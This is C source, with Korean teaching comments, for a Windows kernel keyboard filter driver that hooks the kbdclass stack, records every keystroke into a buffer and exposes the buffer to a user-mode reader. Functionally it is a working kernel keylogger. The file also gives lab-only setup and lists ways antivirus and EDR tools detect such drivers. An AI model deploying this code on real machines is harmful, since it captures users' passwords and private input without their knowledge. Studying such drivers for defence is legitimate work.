/*
 * ================================================================
 *  keyfilter.c — 커널 모드 키보드 필터 드라이버 (학습용)
 * ================================================================
 *
 * [학습 노트] Windows 키보드 입력 파이프라인
 * ─────────────────────────────────────────────────────────────
 *
 *  물리 키보드 (USB/PS2)
 *       │ 하드웨어 인터럽트 (IRQ1 또는 USB IRQ)
 *       ▼
 *  i8042prt.sys / usbhid.sys   ← 포트 드라이버 (Ring 0)
 *       │ KEYBOARD_INPUT_DATA 생성
 *       ▼
 *  kbdclass.sys                ← 클래스 드라이버 (Ring 0)
 *       ▲
 *  ┌────┴──────────────────────────────────────┐
 *  │   KeyFilter.sys  (← 이 드라이버)          │
 *  │   IoAttachDevice 로 스택에 삽입            │
 *  │   IRP_MJ_READ 완료 시 데이터 캡처         │
 *  └───────────────────────────────────────────┘
 *       │ IRP_MJ_READ (KEYBOARD_INPUT_DATA)
 *       ▼
 *  Win32k.sys → Raw Input Thread → 포어그라운드 앱
 *
 * ─────────────────────────────────────────────────────────────
 * [핵심 개념]
 *   IRP (I/O Request Packet)
 *     드라이버 간 데이터 전달 단위. 커널에서 모든 I/O는 IRP로 표현됨.
 *     스택 형태로 각 드라이버를 통과하며, 각 드라이버가 처리/전달/완료함.
 *
 *   IoAttachDevice
 *     우리 드라이버를 kbdclass 디바이스 스택의 위에 삽입.
 *     이후 kbdclass로 향하는 모든 IRP가 먼저 우리에게 도달함.
 *
 *   IoSetCompletionRoutine
 *     IRP를 아래로 전달한 뒤, 완료 시 콜백을 등록.
 *     kbdclass가 KEYBOARD_INPUT_DATA를 채운 뒤 우리 콜백이 호출됨.
 *
 *   IRQL (Interrupt Request Level)
 *     커널에서 실행 컨텍스트 우선순위.
 *     완료 루틴은 DISPATCH_LEVEL(2)에서 실행 → 페이징 불가, 블로킹 불가.
 *     스핀락으로 동기화 필요.
 *
 * ─────────────────────────────────────────────────────────────
 * [방어/탐지 관점] AV/EDR이 이런 드라이버를 찾는 방법:
 *   1) PsSetLoadImageNotifyRoutine — 드라이버 로드 이벤트 감지
 *   2) kbdclass 디바이스 스택 검사 — 예상치 못한 필터 존재 여부
 *   3) ObRegisterCallbacks — 드라이버 객체 접근 감시
 *   4) ETW (Event Tracing for Windows) — Microsoft-Windows-Kernel-EventTracing
 *   5) WinObj / WinDbg: !drvobj kbdclass, !devstack, !devobj
 *
 * ─────────────────────────────────────────────────────────────
 * [한국어 IME 주의]
 *   이 드라이버는 하드웨어 스캔 코드를 캡처합니다.
 *   한국어 IME 조합(예: ㅎ+ㅏ+ㄴ → 한)은 유저 모드(ctfmon.exe)에서 처리됨.
 *   커널 레벨에서는 조합 전 개별 스캔 코드만 보입니다.
 *
 * ─────────────────────────────────────────────────────────────
 * [실습 환경 필수 조건]
 *   - Windows 10/11 VM (Hyper-V / VMware / VirtualBox)
 *   - 테스트 서명 모드: bcdedit /set testsigning on (재부팅 필요)
 *   - Visual Studio 2022 + WDK 10.0.26100 이상
 *   - WinDbg (커널 디버깅용)
 *   - 절대 실제 PC에 설치하지 말 것
 * ================================================================
 */

#include <ntddk.h>
#include <wdm.h>
#include "keyfilter.h"

/* ── 상수 ─────────────────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\Device\\KeyFilter"
#define SYMLINK_NAME     L"\\DosDevices\\KeyFilter"
#define KBD_CLASS_DEV    L"\\Device\\KeyboardClass0"
#define POOL_TAG         'KFLG'   /* 메모리 태그: WinDbg !poolfind KFLG 로 확인 */

/* ── 디바이스 익스텐션 ────────────────────────────────────────────────────── */
/*
 * 각 디바이스 객체(DEVICE_OBJECT)에 연결된 드라이버 전용 데이터.
 * IoCreateDevice 의 DeviceExtensionSize 인자로 크기를 지정함.
 */
typedef struct _DEVICE_EXTENSION {
    PDEVICE_OBJECT  LowerDevice;              /* IoAttachDevice 이 반환한 kbdclass DO */
    KEY_RECORD      LogBuffer[LOG_CAPACITY];  /* 링 버퍼 */
    ULONG           LogHead;                  /* 읽기 포인터 */
    ULONG           LogTail;                  /* 쓰기 포인터 */
    KSPIN_LOCK      LogLock;                  /* DISPATCH_LEVEL 동기화 */
} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

/* ── 전방 선언 ────────────────────────────────────────────────────────────── */
DRIVER_UNLOAD           DriverUnload;
DRIVER_DISPATCH         DispatchPassThrough;
DRIVER_DISPATCH         DispatchRead;
DRIVER_DISPATCH         DispatchControl;
IO_COMPLETION_ROUTINE   ReadCompletion;

/* ================================================================
 * 링 버퍼 — 키스트로크 저장
 * ================================================================
 * Head == Tail  → 비어 있음
 * (Tail+1) % N == Head → 가득 참 (오버플로 시 Head를 전진)
 */
static VOID
LogKeystroke(PDEVICE_EXTENSION Ext, USHORT MakeCode, USHORT Flags)
{
    KIRQL oldIrql;
    ULONG nextTail;

    KeAcquireSpinLock(&Ext->LogLock, &oldIrql);

    Ext->LogBuffer[Ext->LogTail].MakeCode = MakeCode;
    Ext->LogBuffer[Ext->LogTail].Flags    = Flags;
    KeQuerySystemTime(&Ext->LogBuffer[Ext->LogTail].Timestamp);

    nextTail = (Ext->LogTail + 1) % LOG_CAPACITY;

    /* 가득 찼으면 가장 오래된 항목을 덮어씀 */
    if (nextTail == Ext->LogHead)
        Ext->LogHead = (Ext->LogHead + 1) % LOG_CAPACITY;

    Ext->LogTail = nextTail;

    KeReleaseSpinLock(&Ext->LogLock, oldIrql);
}

/* ================================================================
 * ReadCompletion — IRP_MJ_READ 완료 루틴
 * ================================================================
 * [실행 컨텍스트] IRQL <= DISPATCH_LEVEL (보통 DISPATCH_LEVEL)
 *
 * kbdclass 가 IRP를 완료하면 이 함수가 호출됩니다.
 * 이 시점에 SystemBuffer 에는 KEYBOARD_INPUT_DATA 배열이 채워져 있습니다.
 *
 * IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA) = 키스트로크 개수
 */
NTSTATUS
ReadCompletion(
    _In_    PDEVICE_OBJECT DeviceObject,
    _In_    PIRP           Irp,
    _In_opt PVOID          Context)
{
    PDEVICE_EXTENSION   ext;
    PKEYBOARD_INPUT_DATA data;
    ULONG               numKeys, i;

    UNREFERENCED_PARAMETER(Context);

    ext = DeviceObject->DeviceExtension;

    if (Irp->IoStatus.Status == STATUS_SUCCESS) {
        data    = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
        numKeys = (ULONG)(Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));

        for (i = 0; i < numKeys; i++) {
            LogKeystroke(ext, data[i].MakeCode, data[i].Flags);
        }
    }

    /*
     * IRP 가 아래 드라이버에 의해 펜딩으로 표시됐다면
     * 우리도 동일하게 표시해야 합니다. (필수)
     */
    if (Irp->PendingReturned)
        IoMarkIrpPending(Irp);

    return Irp->IoStatus.Status;
}

/* ================================================================
 * DispatchRead — IRP_MJ_READ 핸들러
 * ================================================================
 * [학습 노트]
 *   애플리케이션이 키보드를 읽을 때마다 kbdclass 에 IRP_MJ_READ 가 옵니다.
 *   우리는 이 IRP를 가로채:
 *     1) 완료 루틴을 등록 (IoSetCompletionRoutine)
 *     2) IRP를 kbdclass 로 전달 (IoCallDriver)
 *   kbdclass 가 실제 키 데이터를 채운 뒤 우리 완료 루틴이 호출됩니다.
 */
NTSTATUS
DispatchRead(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP           Irp)
{
    PDEVICE_EXTENSION ext = DeviceObject->DeviceExtension;

    /*
     * IoCopyCurrentIrpStackLocationToNext:
     *   현재 스택 슬롯을 다음 드라이버 슬롯에 복사.
     *   이렇게 해야 완료 루틴 등록 후에도 스택이 정상 유지됩니다.
     *   (IoSkipCurrentIrpStackLocation 사용 시 완료 루틴 등록 불가)
     */
    IoCopyCurrentIrpStackLocationToNext(Irp);

    IoSetCompletionRoutine(
        Irp,
        ReadCompletion,
        NULL,
        TRUE,   /* InvokeOnSuccess */
        TRUE,   /* InvokeOnError   */
        TRUE    /* InvokeOnCancel  */
    );

    return IoCallDriver(ext->LowerDevice, Irp);
}

/* ================================================================
 * DispatchControl — IOCTL 핸들러 (유저 모드 로그 읽기)
 * ================================================================
 * 유저 모드의 reader.py 가 DeviceIoControl(IOCTL_KEYFILTER_READ) 로
 * 이 핸들러를 호출합니다.
 *
 * METHOD_BUFFERED 이므로 입출력 버퍼는 SystemBuffer 하나를 공유합니다.
 * I/O 관리자가 자동으로 NonPagedPool 에 복사본을 만들어 줍니다.
 */
NTSTATUS
DispatchControl(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP           Irp)
{
    PDEVICE_EXTENSION   ext   = DeviceObject->DeviceExtension;
    PIO_STACK_LOCATION  stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS            status = STATUS_SUCCESS;
    ULONG_PTR           info   = 0;
    KIRQL               oldIrql;
    PKEY_RECORD         outBuf;
    ULONG               outLen, capacity, i;

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {

    case IOCTL_KEYFILTER_READ:
        outBuf   = (PKEY_RECORD)Irp->AssociatedIrp.SystemBuffer;
        outLen   = stack->Parameters.DeviceIoControl.OutputBufferLength;
        capacity = outLen / sizeof(KEY_RECORD);

        KeAcquireSpinLock(&ext->LogLock, &oldIrql);

        /* 링 버퍼에서 최대 capacity 개 항목을 꺼냄 */
        for (i = 0; i < capacity && ext->LogHead != ext->LogTail; i++) {
            outBuf[i]    = ext->LogBuffer[ext->LogHead];
            ext->LogHead = (ext->LogHead + 1) % LOG_CAPACITY;
        }

        KeReleaseSpinLock(&ext->LogLock, oldIrql);
        info = (ULONG_PTR)(i * sizeof(KEY_RECORD));
        break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status      = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

/* ================================================================
 * DispatchPassThrough — 나머지 IRP 패스스루
 * ================================================================
 * IRP_MJ_READ / IRP_MJ_DEVICE_CONTROL 외의 모든 IRP는
 * 처리 없이 아래 스택으로 바로 전달합니다.
 */
NTSTATUS
DispatchPassThrough(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP           Irp)
{
    PDEVICE_EXTENSION ext = DeviceObject->DeviceExtension;

    /*
     * IoSkipCurrentIrpStackLocation:
     *   현재 스택 슬롯을 소비하지 않고 포인터만 전진.
     *   완료 루틴 없이 단순 전달 시 사용.
     */
    IoSkipCurrentIrpStackLocation(Irp);
    return IoCallDriver(ext->LowerDevice, Irp);
}

/* ================================================================
 * DriverUnload — 드라이버 언로드 (sc stop KeyFilter)
 * ================================================================
 */
VOID
DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    PDEVICE_OBJECT    dev = DriverObject->DeviceObject;
    PDEVICE_EXTENSION ext = dev->DeviceExtension;
    UNICODE_STRING    symlink;

    RtlInitUnicodeString(&symlink, SYMLINK_NAME);

    /* 심볼릭 링크 제거 → 유저 모드에서 \\.\KeyFilter 접근 불가 */
    IoDeleteSymbolicLink(&symlink);

    /* kbdclass 스택에서 우리 디바이스를 분리 */
    IoDetachDevice(ext->LowerDevice);

    /* 디바이스 객체 삭제 */
    IoDeleteDevice(dev);
}

/* ================================================================
 * DriverEntry — 드라이버 진입점
 * ================================================================
 * [학습 노트]
 *   드라이버가 로드될 때 OS가 이 함수를 호출합니다.
 *   주요 작업:
 *     1) 필터 디바이스 객체 생성 (IoCreateDevice)
 *     2) 유저 모드 접근용 심볼릭 링크 생성 (IoCreateSymbolicLink)
 *     3) kbdclass 스택에 삽입 (IoAttachDevice)
 *     4) IRP 핸들러 등록 (MajorFunction 배열)
 */
NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    NTSTATUS          status;
    UNICODE_STRING    devName, symlink, kbdName;
    PDEVICE_OBJECT    filterDev = NULL;
    PDEVICE_EXTENSION ext;
    ULONG             i;

    UNREFERENCED_PARAMETER(RegistryPath);

    RtlInitUnicodeString(&devName,  DEVICE_NAME);
    RtlInitUnicodeString(&symlink,  SYMLINK_NAME);
    RtlInitUnicodeString(&kbdName,  KBD_CLASS_DEV);

    /* ── 1. 필터 디바이스 객체 생성 ─────────────────────────────────────── */
    status = IoCreateDevice(
        DriverObject,
        sizeof(DEVICE_EXTENSION),   /* DeviceExtension 크기 */
        &devName,
        FILE_DEVICE_KEYBOARD,
        0,
        FALSE,                       /* Exclusive=FALSE: 여러 핸들 허용 */
        &filterDev
    );
    if (!NT_SUCCESS(status)) {
        DbgPrint("[KeyFilter] IoCreateDevice 실패: 0x%08X\n", status);
        return status;
    }

    /* ── 2. 심볼릭 링크 생성 ─────────────────────────────────────────────
     *   \\Device\\KeyFilter  →  \\DosDevices\\KeyFilter
     *   유저 모드에서 CreateFile("\\\\.\\KeyFilter") 로 접근 가능
     */
    status = IoCreateSymbolicLink(&symlink, &devName);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[KeyFilter] IoCreateSymbolicLink 실패: 0x%08X\n", status);
        IoDeleteDevice(filterDev);
        return status;
    }

    /* ── 3. 디바이스 익스텐션 초기화 ────────────────────────────────────── */
    ext = (PDEVICE_EXTENSION)filterDev->DeviceExtension;
    RtlZeroMemory(ext, sizeof(DEVICE_EXTENSION));
    KeInitializeSpinLock(&ext->LogLock);

    /* ── 4. kbdclass 디바이스 스택에 필터로 삽입 ────────────────────────
     *
     *   IoAttachDevice(SourceDevice, TargetDeviceName, &AttachedDevice)
     *
     *   이 호출 이후:
     *     filterDev  → (위) 우리 드라이버
     *     kbdclass0  → (아래) 원래 클래스 드라이버
     *
     *   kbdclass0 으로 향하는 IRP가 먼저 우리에게 도달합니다.
     */
    status = IoAttachDevice(filterDev, &kbdName, &ext->LowerDevice);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[KeyFilter] IoAttachDevice 실패: 0x%08X\n", status);
        IoDeleteSymbolicLink(&symlink);
        IoDeleteDevice(filterDev);
        return status;
    }

    /* ── 5. 디바이스 플래그 동기화 ──────────────────────────────────────── */
    filterDev->Flags |= DO_BUFFERED_IO;
    filterDev->Flags &= ~DO_DEVICE_INITIALIZING;

    /* ── 6. IRP 디스패치 테이블 등록 ─────────────────────────────────────
     *   기본값은 패스스루. 관심 있는 두 가지만 별도 핸들러 지정.
     */
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = DispatchPassThrough;

    DriverObject->MajorFunction[IRP_MJ_READ]           = DispatchRead;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
    DriverObject->DriverUnload                          = DriverUnload;

    DbgPrint("[KeyFilter] 로드 완료. kbdclass 스택에 삽입됨.\n");
    DbgPrint("[KeyFilter] WinDbg: !devstack \\Device\\KeyboardClass0\n");

    return STATUS_SUCCESS;
}
